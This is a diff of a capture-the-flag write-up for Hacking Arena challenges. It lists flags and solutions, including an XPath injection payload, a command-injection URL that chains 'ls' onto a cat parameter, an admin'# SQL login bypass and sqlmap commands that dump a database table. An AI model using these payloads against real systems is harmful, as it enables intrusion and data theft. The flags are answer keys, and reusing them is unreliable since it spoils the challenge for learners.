@@ -55,7 +55,7 @@ and changed the value of options
 --------------------------------------------------------------------------------
 
 
-## norwegian girl name 
+## Norwegian girl name 
 
 **Find the flag here: http://vader.hackingarena.com:809/**
 
@@ -71,3 +71,76 @@ So i made a girl name list and run hydra again. That gave me couple of names whi
 ![pic](./Pictures/norwegiangirls.png)
 ![pic](./Pictures/norwegiangirlsflag.png)
 
+
+
+## Death Star calendar
+---------------------------------------------------------
+
+**the flag**: UiO-Hacking-Arena{Star_path_injection}
+
+**Solution**: ' or position()=5]/*[4]|/a['
+
+**refrence**: http://www.securityidiots.com/Web-Pentest/XPATH-Injection/xpath-injection-part-1.html
+
+**Pictures**
+
+![pic](./Pictures/Death_star.png)
+
+
+## Empty page
+---------------------------------------------------------
+**The flag**: Hacking-Arena{n0t_empty_it_is_never_empty}
+
+**The solution**: 
+
+    http://kenobi.hackingarena.com:801/index.php?cmd=/;%20ls%20/var
+
+    http://kenobi.hackingarena.com:801/index.php?cmd=/var/sikkerhetsfestivalen/flag
+
+**Description**:
+
+The source code shows the syntaks of the link that it takes cmd after index php
+
+The link below shows that the website runs 'cat' any file in the command 
+
+    http://kenobi.hackingarena.com:801/index.php?cmd=/index.php
+
+so i finished the cat command with ";" and run "ls" on => /var => sikkerhetfestival
+
+there was a file called flag.txt 
+
+**Pictures**
+
+![pic](./Pictures/empty_page.png)
+
+
+## db login
+---------------------------------------------------------
+
+**the tag**: Hacking-Arena{Tw1st_and_sh0000uuut}
+
+**Solution**: admin'#
+
+![pic](./Pictures/dblogin.png)
+
+
+## Beatles song catalogue 1
+----------------------------------------------------------
+
+**The Flag**: Hacking-Arena{H4rd d4y5 0verfl0w}
+
+**Solution**:
+
+    #Found a vulnderablity in "year"
+    sqlmap -u "http://kenobi.hackingarena.com:915/index.php?year=1963" --technique=B
+    sqlmap -u "http://kenobi.hackingarena.com:915/index.php?year=1963" --dbs --flush-session
+    sqlmap -u "http://kenobi.hackingarena.com:915/index.php?year=1963" --dbs
+    sqlmap -u "http://kenobi.hackingarena.com:915/index.php?year=1963" --tables -D BeatlesData
+    sqlmap -u "http://kenobi.hackingarena.com:915/index.php?year=1963" -D BeatlesData -T Flag --dump
+
+**Pictures**
+
+![pic](./Pictures/Beatles_1.png)
+
+
+------------------
